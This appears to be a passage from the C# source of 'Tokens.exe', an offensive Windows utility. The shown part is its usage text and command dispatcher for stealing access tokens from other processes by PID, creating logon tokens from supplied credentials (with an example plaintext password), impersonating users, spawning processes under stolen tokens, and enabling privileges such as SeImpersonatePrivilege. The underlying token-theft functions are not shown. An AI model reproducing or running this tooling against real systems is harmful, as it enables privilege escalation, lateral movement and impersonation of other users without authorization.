        Console.WriteLine("Usage:     Tokens.exe enable_priv <privilege>");
        Console.WriteLine("Usage:     Tokens.exe disable_priv <privilege>");
        Console.WriteLine("Usage:     Tokens.exe list_privs");
        Console.WriteLine("Usage:     Tokens.exe rev2self\n");
        Console.WriteLine("Example:   Tokens.exe steal_token 4468");
        Console.WriteLine("Example:   Tokens.exe make_token borgar kclark Summer2019! LOGON32_LOGON_INTERACTIVE");
        Console.WriteLine("Example:   Tokens.exe list_tokens");
        Console.WriteLine("Example:   Tokens.exe sample_processes");
        Console.WriteLine("Example:   Tokens.exe impersonate_user BORGAR\\kclark");
        Console.WriteLine("Example:   Tokens.exe create_process whoami /all");
        Console.WriteLine("Example:   Tokens.exe use_token 3");
        Console.WriteLine("Example:   Tokens.exe whoami");
        Console.WriteLine("Example:   Tokens.exe list_privs");
        Console.WriteLine("Example:   Tokens.exe enable_priv SeImpersonatePrivilege");
        Console.WriteLine("Example:   Tokens.exe disable_priv SeBackupPrivilege");
        Console.WriteLine("Example:   Tokens.exe rev2self\n");
    }
    public static void Main(string[] args)
    {
        InitTokenList();

        if (args.Length < 1 || args[0] == "/help" || args[0] == "/h" || args[0] == "/?" || args[0] == "-help" || args[0] == "-h" || args[0] == "--help")
        {
            usage();
        }

        else if (args[0] == "steal_token")
        {
            if (int.TryParse(args[1], out int pid))
            {
                if (StealToken(pid))
                {
                    Console.WriteLine("Current user after impersonation: " + GetCurrentTokenUser());
                }
            }
            else
            {
                Console.WriteLine("[-] Could not parse PID (" + args[1] + ") as an integer");
            }
        }
        else if (args[0] == "make_token" && (args.Length == 4 || args.Length == 5))
        {
            string domain = args[1];
            string username = args[2];
            string password = args[3];
            if (args.Length == 5)
            {
                try
                {
                    LogonProvider logonType = (LogonProvider)Enum.Parse(typeof(LogonProvider), args[4]);
                    MakeToken(domain, username, password, logonType);
                }
                catch
                {
                    Console.WriteLine("[-] Could not parse logonType (" + args[4] + ") as an valid logon type");
                }
            }
            else
            {
                MakeToken(domain, username, password);
            }
        }
        else if (args[0] == "list_tokens")
        {
            ListTokens();
        }
        else if (args[0] == "list_privs")
        {
            ListPrivs();
        }
        else if (args[0] == "enable_priv" && args.Length == 2)
        {
            EnablePriv(args[1]);
        }
        else if (args[0] == "disable_priv" && args.Length == 2)
        {
            DisablePriv(args[1]);
        }
        else if (args[0] == "impersonate_user")
        {
            if (args.Length > 1)
            {
                string username = args[1];
                ImpersonateUser(username);
            }
            else
            {
                usage();
            }
        }
        else if (args[0] == "sample_processes")
        {
            SampleProcesses();
        }
        else if (args[0] == "create_process")
        {
            string commandLine = "";
            if (args.Length > 1)
            {
                string program = args[1];
                if (args.Length > 2)
                {
                    commandLine = parseArgs(args.Skip(2).Take(args.Length).ToArray());
                }
                CreateProcessWithToken(CurrentToken, program, commandLine);
            }
            else
            {
                usage();
            }
        }
        else if (args[0] == "use_token" && args.Length == 2)
        {
            if (int.TryParse(args[1], out int index))
            {
                if (UseToken(index))
                {
                    Console.WriteLine("Current user after switching tokens: " + GetCurrentTokenUser());
                }
            }
            else
            {
                Console.WriteLine("Could not parse index (" + args[1] + ") as an integer");
            }
        }
        else if (args[0] == "whoami")
        {
            Console.WriteLine(GetCurrentTokenUser());
        }
        else if (args[0] == "rev2self")
        {
            Rev2Self();
            CurrentToken = WindowsIdentity.GetCurrent().AccessToken.DangerousGetHandle();
            Console.WriteLine("Current user after rev2self: " + GetCurrentTokenUser());
        }
        else if (args[0] == "interactive") // Used for testing only
        {
            while (true)
            {
                Console.Write("Input > ");
                string[] input = Console.ReadLine().Split(' ');
                Main(input);
            }
        }
        else
        {
            usage();
        }
    }
}
